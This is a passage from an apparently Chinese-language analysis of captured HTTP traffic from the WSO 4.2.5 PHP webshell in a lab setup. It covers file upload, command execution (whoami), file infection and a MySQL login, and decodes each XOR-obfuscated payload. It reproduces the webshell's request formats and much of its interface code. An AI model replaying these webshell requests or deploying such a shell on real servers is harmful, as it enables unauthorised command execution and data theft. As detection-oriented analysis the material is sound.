			<td><form onsubmit="g(null,this.c.value,'');return false;"><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='/var/www/html/webshell-master/php/wso/'><input type=submit value='submit'></form></td>
			<td><form onsubmit="g('FilesTools',null,this.f.value);return false;"><span>Read file:</span><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
		</tr><tr>
			<td><form onsubmit="g('FilesMan',null,'mkdir',this.d.value);return false;"><span>Make dir:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=text name=d required><input type=submit value='submit'></form></td>
			<td><form onsubmit="g('FilesTools',null,this.f.value,'mkfile');return false;"><span>Make file:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
		</tr><tr>
			<td><form onsubmit="g('Console',null,this.c.value);return false;"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='submit'></form></td>
			<td><form method='post' ENCTYPE='multipart/form-data'>
			<input type=hidden name=a value='FilesMan'>
			<input type=hidden name=c value='/var/www/html/webshell-master/php/wso/'>
			<input type=hidden name=p1 value='uploadFile'>
			<input type=hidden name=ne value=''>
			<input type=hidden name=charset value='UTF-8'>
			<span>Upload file:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='submit'></form><br  ></td>
		</tr></table></div>
		<!-- particles --> <div id='particles-js'></div><script src='http://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></script>
		<script>particlesJS('particles-js', {'particles':{'number':{'value':80,'density':{'enable':true,'value_area':800}},'color':{'value':'#ffffff'},'shape':{'type':'triangle','stroke':{'width':0,'color':'#000000'},'polygon':{'nb_sides':5},'image':{'src':'img/github.svg','width':100,'height':100}},'opacity':{'value':0.5,'random':true,'anim':{'enable':false,'speed':1,'opacity_min':0.1,'sync':false}},'size':{'value':3,'random':true,'anim':{'enable':false,'speed':40,'size_min':0.1,'sync':false}},'line_linked':{'enable':true,'distance':200,'color':'#ffffff','opacity':0.4,'width':1},'move':{'enable':true,'speed':1,'direction':'none','random':true,'straight':false,'out_mode':'out','bounce':false,'attract':{'enable':false,'rotateX':10000,'rotateY':10000}}},'interactivity':{'detect_on':'canvas','events':{'onhover':{'enable':true,'mode':'grab'},'onclick':{'enable':true,'mode':'repulse'},'resize':true},'modes':{'grab':{'distance':200,'line_linked':{'opacity':0.5}},'bubble':{'particles_nb':2}}},'retina_detect':true});</script>
		</body></html>

##### 4.2.3.2&emsp;数据包分析 #####
>请求数据包攻击载荷：<font color=red>------WebKitFormBoundaryIx9sOhX04md8pGDP
Content-Disposition: form-data; name="a"

FilesMan
------WebKitFormBoundaryIx9sOhX04md8pGDP
Content-Disposition: form-data; name="c"

/var/www/html/webshell-master/php/wso/
------WebKitFormBoundaryIx9sOhX04md8pGDP
Content-Disposition: form-data; name="p1"

uploadFile
------WebKitFormBoundaryIx9sOhX04md8pGDP
Content-Disposition: form-data; name="ne"


------WebKitFormBoundaryIx9sOhX04md8pGDP
Content-Disposition: form-data; name="charset"

UTF-8
------WebKitFormBoundaryIx9sOhX04md8pGDP
Content-Disposition: form-data; name="f[]"; filename="............-.......docx"
Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document...
</font>

>数据包攻击载荷分析：去除掉------WebKitFormBoundaryIx9sOhX04md8pGDP这些混淆，可以看到真正的攻击为：name="a" FilesMan， name="c" /var/www/html/webshell-master/php/wso/，name="p1" uploadFile，name="charset" UTF-8，name="f[]"; filename="............-.......docx"

>响应包具体分析：该响应包仍然返回的是整个html页面。

>具体信息如图4.2.3.1所示：<br>![wso_shell]({{ site.baseurl }}/images/wso_shell/Files_upload.png)<br><center>图4.2.3.1</center>

### 4.3&emsp;命令执行操作 ###
##### 4.3.1&emsp;数据包内容 #####
**请求数据包**
<br>

	POST /webshell-master/php/wso/wso-4.2.5.php HTTP/1.1
	Host: 192.168.182.143
	Connection: keep-alive
	Content-Length: 161
	Origin: http://192.168.182.143
	User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
	Content-Type: application/x-www-form-urlencoded
	Accept: */*
	Referer: http://192.168.182.143/webshell-master/php/wso/wso-4.2.5.php
	Accept-Encoding: gzip, deflate
	Accept-Language: zh-CN,zh;q=0.8
	Cookie: da94407ecf64bda7c0ac6ea1fa4477d8key=d69aa478a72ecd3a99c77af6fcf6b917; act=%2Fvar%2Fwww%2Fhtml%2Fwebshell-master%2Fphp%2Fwso%2Fhello.txt; f=N%3B; c=%2Fvar%2Fwww%2Fhtml%2Fwebshell-master%2Fphp%2Fwso%2F; da94407ecf64bda7c0ac6ea1fa4477d8=21232f297a57a5a743894a0e4a801fc3; da94407ecf64bda7c0ac6ea1fa4477d8stderr_to_out=1; da94407ecf64bda7c0ac6ea1fa4477d8ajax=0; PHPSESSID=mh6l96lmrd0so2isi315c3loi4
	
	ajax=true&a=C3ZgQDplfEMUK1VV&c=FncDXTo%2BfAMqSQseLzIYGDtxaEkDAyFPOD01QDsUaEYDNQBdFDUAQy4TC0oWdz1POy59DQ%3D%3D&p1=PnYxQwAAdEA%3D&p2=FxVkCA%3D%3D&p3=&charset=UTF-8

**响应数据包**
<br>

	115
	d.cf.cmd.value='';
	d.cf.output.value+='\n$ whoami 2>&1\nwww-data';d.cf.output.scrollTop = d.cf.output.scrollHeight;

#### 4.3.2&emsp;数据包分析 ####
>数据包攻击载荷：<font color=red>ajax=true&a=C3ZgQDplfEMUK1VV&c=FncDXTo%2BfAMqSQseLzIYGDtxaEkDAyFPOD01QDsUaEYDNQBdFDUAQy4TC0oWdz1POy59DQ%3D%3D&p1=PnYxQwAAdEA%3D&p2=FxVkCA%3D%3D&p3=&charset=UTF-8</font>

>数据包攻击载荷分析：ajax=true 攻击载荷提交方式为ajax异步请求方式，局部刷新页面。解密相应攻击载荷后为：ajax=true&a=Console&c=/var/www/html/webshell-master/php/wso/&p1=whoami&p2=1&p3=&charset=UTF-8

>响应体数据分析：响应体返回数据为具体攻击载荷执行结果，通过对源代码进行查看，可以看出：d.cf.cmd.value，d.cf.output.value等为源代码中写死的固定格式。

>具体信息如图4.3.1所示：<br>![wso_shell]({{ site.baseurl }}/images/wso_shell/whoami.png)<br><center>图4.3.1</center>

### 4.4&emsp; Infect ###
#### 4.4.1&emsp;数据包内容 ####
**请求数据包**
<br>

	POST /webshell-master/php/wso/wso-4.2.5.php HTTP/1.1
	Host: 192.168.182.143
	Connection: keep-alive
	Content-Length: 137
	Cache-Control: max-age=0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
	Origin: http://192.168.182.143
	Upgrade-Insecure-Requests: 1
	User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
	Content-Type: application/x-www-form-urlencoded
	Referer: http://192.168.182.143/webshell-master/php/wso/wso-4.2.5.php
	Accept-Encoding: gzip, deflate
	Accept-Language: zh-CN,zh;q=0.8
	Cookie: da94407ecf64bda7c0ac6ea1fa4477d8key=d69aa478a72ecd3a99c77af6fcf6b917; da94407ecf64bda7c0ac6ea1fa4477d8=21232f297a57a5a743894a0e4a801fc3; da94407ecf64bda7c0ac6ea1fa4477d8ajax=1; PHPSESSID=n4j9k5jn2b9fk5go2rh5vks1m3
	
	a=CRNsWAMACwA%3D&c=FncDXTo%2BfAMqSQseLzIYGDtxaEkDAyFPOD01QDsUaEYDNQBdFDUAQy4TC0oWdz1POy59DQ%3D%3D&p1=OxNsWAMACwA%3D&p2=&p3=&charset=UTF-8

**响应数据包**
<br>

	HTTP/1.1 200 OK
	Date: Tue, 08 Nov 2016 09:24:44 GMT
	Server: Apache/2.4.7 (Ubuntu)
	X-Powered-By: PHP/5.5.9-1ubuntu4.19
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 4314
	Keep-Alive: timeout=5, max=100
	Connection: Keep-Alive
	Content-Type: text/html
	
	<html><head><meta http-equiv='Content-Type' content='text/html; charset=UTF-8'><title>192.168.182.143 - WSO 4.2.5</title>
	<style>
		body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;}
		#particles-js{width: 100%; height: 100px; background-color: #060a10; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;}
		body,td,th	{font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;}
		table.info	{color:#C3C3C3;}
		table#toolsTbl {background-color: #060A10;}
		span,h1,a	{color:#fff !important;}
		span		{font-weight:bolder;}
		h1			{border-left:5px solid #2E6E9C;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px;}
		div.content	{padding:5px;margin-left:5px;background-color:#060a10;}
		a			{text-decoration:none;}
		a:hover		{text-decoration:underline;}
		.tooltip::after {background:#0663D5;color:#FFF;content: attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden;}
		.tooltip:hover::after {opacity:1;visibility:visible;}
		.ml1		{border:1px solid #202832;padding:5px;margin:0;overflow:auto;}
		.bigarea	{min-width:100%;max-width:100%;height:400px;}
		input, textarea, select	{margin:0;color:#fff;background-color:#202832;border:none;font:9pt Courier New;outline:none;}
		label {position:relative}
		label:after {content:'<>';font:10px 'Consolas', monospace;color:#fff;-webkit-transform:rotate(90deg);-moz-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg);right:3px; top:3px;padding:0;position:absolute;pointer-events:none;}
		label:before {content:'';right:0; top:0;width:17px; height:17px;background:#202832;position:absolute;pointer-events:none;display:block;}
		form		{margin:0px;}
		#toolsTbl	{text-align:center;}
		#fak 		{background:none;}
		#fak td 	{padding:5px 0 0 0;}
		iframe		{border:1px solid #060a10;}
		.toolsInp	{width:300px}
		.main th	{text-align:left;background-color:#060a10;}
		.main tr:hover{background-color:#354252;}
		.main td, th{vertical-align:middle;}
		input[type='submit']{background-color:#2E6E9C;}
		input[type='button']{background-color:#2E6E9C;}
		input[type='submit']:hover{background-color:#56AD15;}
		input[type='button']:hover{background-color:#56AD15;}
		.l1			{background-color:#202832;}
		pre			{font:9pt Courier New;}
	</style>
	<script>
	    var c_ = '/var/www/html/webshell-master/php/wso/';
	    var a_ = 'Infect'
	    var charset_ = 'UTF-8';
	    var p1_ = 'infect';
	    var p2_ = '';
	    var p3_ = '';
	    var d = document;
		
		function encrypt(str,pwd){if(pwd==null||pwd.length<=0){return null;}str=base64_encode(str);pwd=base64_encode(pwd);var enc_chr='';var enc_str='';var i=0;while(i<str.length){for(var j=0;j<pwd.length;j++){enc_chr=str.charCodeAt(i)^pwd.charCodeAt(j);enc_str+=String.fromCharCode(enc_chr);i++;if(i>=str.length)break;}}return base64_encode(enc_str);}
		function utf8_encode(argString){var string=(argString+'');var utftext='',start,end,stringl=0;start=end=0;stringl=string.length;for(var n=0;n<stringl;n++){var c1=string.charCodeAt(n);var enc=null;if(c1<128){end++;}else if(c1>127&&c1<2048){enc=String.fromCharCode((c1>>6)|192)+String.fromCharCode((c1&63)|128);}else{enc=String.fromCharCode((c1>>12)|224)+String.fromCharCode(((c1>>6)&63)|128)+String.fromCharCode((c1&63)|128);}if(enc!==null){if(end>start){utftext+=string.slice(start,end);}utftext+=enc;start=end=n+1;}}if(end>start){utftext+=string.slice(start,stringl);}return utftext;}
		function base64_encode(data){var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var o1,o2,o3,h1,h2,h3,h4,bits,i=0,ac=0,enc='',tmp_arr=[];if (!data){return data;}data=utf8_encode(data+'');do{o1=data.charCodeAt(i++);o2=data.charCodeAt(i++);o3=data.charCodeAt(i++);bits=o1<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;tmp_arr[ac++]=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);}while(i<data.length);enc=tmp_arr.join('');switch (data.length%3){case 1:enc=enc.slice(0,-2)+'==';break;case 2:enc=enc.slice(0,-1)+'=';break;}return enc;}
		function set(a,c,p1,p2,p3,charset) {
			if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
			if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
			if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
			if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
			if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
			d.mf.a.value = encrypt(d.mf.a.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.c.value = encrypt(d.mf.c.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p1.value = encrypt(d.mf.p1.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p2.value = encrypt(d.mf.p2.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p3.value = encrypt(d.mf.p3.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
		}
		function g(a,c,p1,p2,p3,charset) {
			set(a,c,p1,p2,p3,charset);
			d.mf.submit();
		}
		function a(a,c,p1,p2,p3,charset) {
			set(a,c,p1,p2,p3,charset);
			var params = 'ajax=true';
			for(i=0;i<d.mf.elements.length;i++)
				params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
			sr('/webshell-master/php/wso/wso-4.2.5.php', params);
		}
		function sr(url, params) {
			if (window.XMLHttpRequest)
				req = new XMLHttpRequest();
			else if (window.ActiveXObject)
				req = new ActiveXObject('Microsoft.XMLHTTP');
	        if (req) {
	            req.onreadystatechange = processReqChange;
	            req.open('POST', url, true);
	            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
	            req.send(params);
	        }
		}
		function processReqChange() {
			if( (req.readyState == 4) )
				if(req.status == 200) {
					var reg = new RegExp("(\\d+)([\\S\\s]*)", 'm');
					var arr=reg.exec(req.responseText);
					eval(arr[2].substr(0, arr[1]));
				} else alert('Request error!');
		}
	</script>
	<head><body><div style='position:absolute;background-color:rgba(95, 110, 130, 0.3);width:100%;top:0;left:0;'>
	<form method=post name=mf style='display:none;'>
	<input type=hidden name=a>
	<input type=hidden name=c>
	<input type=hidden name=p1>
	<input type=hidden name=p2>
	<input type=hidden name=p3>
	<input type=hidden name=charset>
	</form><table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:</span></td><td><nobr>Linux ubuntu 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64 <a href="http://noreferer.de/?http://www.google.com/search?q=Linux+ubuntu+3.19.0-25-generic+%2326%7E14.04.1-Ubuntu+SMP+Fri+Jul+24+21%3A16%3A20+UTC+2015+x86_64" target="_blank">[ Google ]</a> <a href="http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=Linux+Kernel+3.19.0" target=_blank>[ Exploit-DB ]</a></nobr><br>33 ( www-data ) <span>Group:</span> 33 ( www-data )<br>5.5.9-1ubuntu4.19 <span>Safe mode:</span> <font color=#FFDB5F><b>OFF</b></font> <a href=# onclick="g('Php',null,null,'info')">[ phpinfo ]</a> <span>Datetime:</span> 2016-11-08 17:24:44<br>18.58 GB <span>Free:</span> 13.12 GB (70.62%)<br><a href='#' onclick='g("FilesMan","/")'>/</a><a href='#' onclick='g("FilesMan","/var/")'>var/</a><a href='#' onclick='g("FilesMan","/var/www/")'>www/</a><a href='#' onclick='g("FilesMan","/var/www/html/")'>html/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/")'>webshell-master/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/php/")'>php/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/php/wso/")'>wso/</a> <font color=#FFDB5F><b>drwxrwxrwx</b></font> <a href=# onclick="g('FilesMan','/var/www/html/webshell-master/php/wso','','','')">[ home ]</a><br></td><td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)"><option value="UTF-8" selected>UTF-8</option><option value="Windows-1251" >Windows-1251</option><option value="KOI8-R" >KOI8-R</option><option value="KOI8-U" >KOI8-U</option><option value="cp866" >cp866</option></select></label><br><span>Server IP:</span><br>192.168.182.143<br><span>Client IP:</span><br>192.168.182.1</nobr></td></tr></table><table style="background-color:#2E6E9C;" cellpadding=3 cellspacing=0 width=100%><tr><th>[ <a href="#" onclick="g('SecInfo',null,'','','')">Sec. Info</a> ]</th><th>[ <a href="#" onclick="g('FilesMan',null,'','','')">Files</a> ]</th><th>[ <a href="#" onclick="g('Console',null,'','','')">Console</a> ]</th><th>[ <a href="#" onclick="g('Infect',null,'','','')">Infect</a> ]</th><th>[ <a href="#" onclick="g('Sql',null,'','','')">Sql</a> ]</th><th>[ <a href="#" onclick="g('Php',null,'','','')">Php</a> ]</th><th>[ <a href="#" onclick="g('SafeMode',null,'','','')">Safe mode</a> ]</th><th>[ <a href="#" onclick="g('StringTools',null,'','','')">String tools</a> ]</th><th>[ <a href="#" onclick="g('Bruteforce',null,'','','')">Bruteforce</a> ]</th><th>[ <a href="#" onclick="g('Network',null,'','','')">Network</a> ]</th><th>[ <a href="#" onclick="g('Logout',null,'','','')">Logout</a> ]</th><th>[ <a href="#" onclick="g('SelfRemove',null,'','','')">Self remove</a> ]</th></tr></table><div><h1>Infect</h1><div class=content>/var/www/html/DVWA-1.9/hackable/uploads/PHOME_HOME.php<br><font color=red size=14>1</font>
	</div>
	<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%>
		<tr>
			<td><form onsubmit="g(null,this.c.value,'');return false;"><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='/var/www/html/webshell-master/php/wso/'><input type=submit value='submit'></form></td>
			<td><form onsubmit="g('FilesTools',null,this.f.value);return false;"><span>Read file:</span><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
		</tr><tr>
			<td><form onsubmit="g('FilesMan',null,'mkdir',this.d.value);return false;"><span>Make dir:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=text name=d required><input type=submit value='submit'></form></td>
			<td><form onsubmit="g('FilesTools',null,this.f.value,'mkfile');return false;"><span>Make file:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
		</tr><tr>
			<td><form onsubmit="g('Console',null,this.c.value);return false;"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='submit'></form></td>
			<td><form method='post' ENCTYPE='multipart/form-data'>
			<input type=hidden name=a value='FilesMan'>
			<input type=hidden name=c value='/var/www/html/webshell-master/php/wso/'>
			<input type=hidden name=p1 value='uploadFile'>
			<input type=hidden name=ne value=''>
			<input type=hidden name=charset value='UTF-8'>
			<span>Upload file:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='submit'></form><br  ></td>
		</tr></table></div>
		<!-- particles --> <div id='particles-js'></div><script src='http://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></script>
		<script>particlesJS('particles-js', {'particles':{'number':{'value':80,'density':{'enable':true,'value_area':800}},'color':{'value':'#ffffff'},'shape':{'type':'triangle','stroke':{'width':0,'color':'#000000'},'polygon':{'nb_sides':5},'image':{'src':'img/github.svg','width':100,'height':100}},'opacity':{'value':0.5,'random':true,'anim':{'enable':false,'speed':1,'opacity_min':0.1,'sync':false}},'size':{'value':3,'random':true,'anim':{'enable':false,'speed':40,'size_min':0.1,'sync':false}},'line_linked':{'enable':true,'distance':200,'color':'#ffffff','opacity':0.4,'width':1},'move':{'enable':true,'speed':1,'direction':'none','random':true,'straight':false,'out_mode':'out','bounce':false,'attract':{'enable':false,'rotateX':10000,'rotateY':10000}}},'interactivity':{'detect_on':'canvas','events':{'onhover':{'enable':true,'mode':'grab'},'onclick':{'enable':true,'mode':'repulse'},'resize':true},'modes':{'grab':{'distance':200,'line_linked':{'opacity':0.5}},'bubble':{'particles_nb':2}}},'retina_detect':true});</script>
		</body></html>

#### 4.4.2&emsp;数据包分析 ####
>请求数据包攻击载荷：<font color=red>a=CRNsWAMACwA%3D&c=FncDXTo%2BfAMqSQseLzIYGDtxaEkDAyFPOD01QDsUaEYDNQBdFDUAQy4TC0oWdz1POy59DQ%3D%3D&p1=OxNsWAMACwA%3D&p2=&p3=&charset=UTF-8</font>

>数据包攻击载荷攻击载荷分析：a=Infect&c=/var/www/html/webshell-master/php/wso/&p1=infect&p2=&p3=&charset=UTF-8。

>响应包具体分析：该响应包仍然返回的是整个html页面。

>具体信息如图4.4.2所示：<br>![wso_shell]({{ site.baseurl }}/images/wso_shell/infect.png)<br><center>图4.4.2</center>

### 4.5&emsp;数据库操作 ###
#### 4.5.1&emsp;数据包内容 ####
**请求数据包**
<br>

	POST /webshell-master/php/wso/wso-4.2.5.php HTTP/1.1
	Host: 192.168.182.143
	Connection: keep-alive
	Content-Length: 217
	Cache-Control: max-age=0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
	Origin: http://192.168.182.143
	Upgrade-Insecure-Requests: 1
	User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
	Content-Type: application/x-www-form-urlencoded
	Referer: http://192.168.182.143/webshell-master/php/wso/wso-4.2.5.php
	Accept-Encoding: gzip, deflate
	Accept-Language: zh-CN,zh;q=0.8
	Cookie: da94407ecf64bda7c0ac6ea1fa4477d8key=d69aa478a72ecd3a99c77af6fcf6b917; act=%2Fvar%2Fwww%2Fhtml%2Fwebshell-master%2Fphp%2Fwso%2Fhello.txt; f=N%3B; c=%2Fvar%2Fwww%2Fhtml%2Fwebshell-master%2Fphp%2Fwso%2F; da94407ecf64bda7c0ac6ea1fa4477d8=21232f297a57a5a743894a0e4a801fc3; da94407ecf64bda7c0ac6ea1fa4477d8stderr_to_out=1; da94407ecf64bda7c0ac6ea1fa4477d8ajax=1; PHPSESSID=mh6l96lmrd0so2isi315c3loi4
	
	ne=&a=Sql&p1=&p2=&c=%2Fvar%2Fwww%2Fhtml%2Fwebshell-master%2Fphp%2Fwso%2F&charset=UTF-8&type=mysql&sql_host=localhost&sql_login=root&sql_pass=123456&sql_base=mysql&c=%2Fvar%2Fwww%2Fhtml%2Fwebshell-master%2Fphp%2Fwso%2F

**响应数据包**
<br>

	HTTP/1.1 200 OK
	Date: Fri, 04 Nov 2016 07:11:02 GMT
	Server: Apache/2.4.7 (Ubuntu)
	X-Powered-By: PHP/5.5.9-1ubuntu4.19
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 5794
	Keep-Alive: timeout=5, max=99
	Connection: Keep-Alive
	Content-Type: text/html

	<html><head><meta http-equiv='Content-Type' content='text/html; charset=UTF-8'><title>192.168.182.143 - WSO 4.2.5</title>
	<style>
		body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;}
		#particles-js{width: 100%; height: 100px; background-color: #060a10; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;}
		body,td,th	{font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;}
		table.info	{color:#C3C3C3;}
		table#toolsTbl {background-color: #060A10;}
		span,h1,a	{color:#fff !important;}
		span		{font-weight:bolder;}
		h1			{border-left:5px solid #2E6E9C;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px;}
		div.content	{padding:5px;margin-left:5px;background-color:#060a10;}
		a			{text-decoration:none;}
		a:hover		{text-decoration:underline;}
		.tooltip::after {background:#0663D5;color:#FFF;content: attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden;}
		.tooltip:hover::after {opacity:1;visibility:visible;}
		.ml1		{border:1px solid #202832;padding:5px;margin:0;overflow:auto;}
		.bigarea	{min-width:100%;max-width:100%;height:400px;}
		input, textarea, select	{margin:0;color:#fff;background-color:#202832;border:none;font:9pt Courier New;outline:none;}
		label {position:relative}
		label:after {content:'<>';font:10px 'Consolas', monospace;color:#fff;-webkit-transform:rotate(90deg);-moz-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg);right:3px; top:3px;padding:0;position:absolute;pointer-events:none;}
		label:before {content:'';right:0; top:0;width:17px; height:17px;background:#202832;position:absolute;pointer-events:none;display:block;}
		form		{margin:0px;}
		#toolsTbl	{text-align:center;}
		#fak 		{background:none;}
		#fak td 	{padding:5px 0 0 0;}
		iframe		{border:1px solid #060a10;}
		.toolsInp	{width:300px}
		.main th	{text-align:left;background-color:#060a10;}
		.main tr:hover{background-color:#354252;}
		.main td, th{vertical-align:middle;}
		input[type='submit']{background-color:#2E6E9C;}
		input[type='button']{background-color:#2E6E9C;}
		input[type='submit']:hover{background-color:#56AD15;}
		input[type='button']:hover{background-color:#56AD15;}
		.l1			{background-color:#202832;}
		pre			{font:9pt Courier New;}
	</style>
	<script>
	    var c_ = '/var/www/html/webshell-master/php/wso/';
	    var a_ = 'FilesMan'
	    var charset_ = 'UTF-8';
	    var p1_ = '';
	    var p2_ = '';
	    var p3_ = '';
	    var d = document;
		
		function encrypt(str,pwd){if(pwd==null||pwd.length<=0){return null;}str=base64_encode(str);pwd=base64_encode(pwd);var enc_chr='';var enc_str='';var i=0;while(i<str.length){for(var j=0;j<pwd.length;j++){enc_chr=str.charCodeAt(i)^pwd.charCodeAt(j);enc_str+=String.fromCharCode(enc_chr);i++;if(i>=str.length)break;}}return base64_encode(enc_str);}
		function utf8_encode(argString){var string=(argString+'');var utftext='',start,end,stringl=0;start=end=0;stringl=string.length;for(var n=0;n<stringl;n++){var c1=string.charCodeAt(n);var enc=null;if(c1<128){end++;}else if(c1>127&&c1<2048){enc=String.fromCharCode((c1>>6)|192)+String.fromCharCode((c1&63)|128);}else{enc=String.fromCharCode((c1>>12)|224)+String.fromCharCode(((c1>>6)&63)|128)+String.fromCharCode((c1&63)|128);}if(enc!==null){if(end>start){utftext+=string.slice(start,end);}utftext+=enc;start=end=n+1;}}if(end>start){utftext+=string.slice(start,stringl);}return utftext;}
		function base64_encode(data){var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var o1,o2,o3,h1,h2,h3,h4,bits,i=0,ac=0,enc='',tmp_arr=[];if (!data){return data;}data=utf8_encode(data+'');do{o1=data.charCodeAt(i++);o2=data.charCodeAt(i++);o3=data.charCodeAt(i++);bits=o1<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;tmp_arr[ac++]=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);}while(i<data.length);enc=tmp_arr.join('');switch (data.length%3){case 1:enc=enc.slice(0,-2)+'==';break;case 2:enc=enc.slice(0,-1)+'=';break;}return enc;}
		function set(a,c,p1,p2,p3,charset) {
			if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
			if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
			if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
			if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
			if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
			d.mf.a.value = encrypt(d.mf.a.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.c.value = encrypt(d.mf.c.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p1.value = encrypt(d.mf.p1.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p2.value = encrypt(d.mf.p2.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p3.value = encrypt(d.mf.p3.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
		}
		function g(a,c,p1,p2,p3,charset) {
			set(a,c,p1,p2,p3,charset);
			d.mf.submit();
		}
		function a(a,c,p1,p2,p3,charset) {
			set(a,c,p1,p2,p3,charset);
			var params = 'ajax=true';
			for(i=0;i<d.mf.elements.length;i++)
				params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
			sr('/webshell-master/php/wso/wso-4.2.5.php', params);
		}
		function sr(url, params) {
			if (window.XMLHttpRequest)
				req = new XMLHttpRequest();
			else if (window.ActiveXObject)
				req = new ActiveXObject('Microsoft.XMLHTTP');
	        if (req) {
	            req.onreadystatechange = processReqChange;
	            req.open('POST', url, true);
	            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
	            req.send(params);
	        }
		}
		function processReqChange() {
			if( (req.readyState == 4) )
				if(req.status == 200) {
					var reg = new RegExp("(\\d+)([\\S\\s]*)", 'm');
					var arr=reg.exec(req.responseText);
					eval(arr[2].substr(0, arr[1]));
				} else alert('Request error!');
		}
	</script>
	<head><body><div style='position:absolute;background-color:rgba(95, 110, 130, 0.3);width:100%;top:0;left:0;'>
	<form method=post name=mf style='display:none;'>
	<input type=hidden name=a>
	<input type=hidden name=c>
	<input type=hidden name=p1>
	<input type=hidden name=p2>
	<input type=hidden name=p3>
	<input type=hidden name=charset>
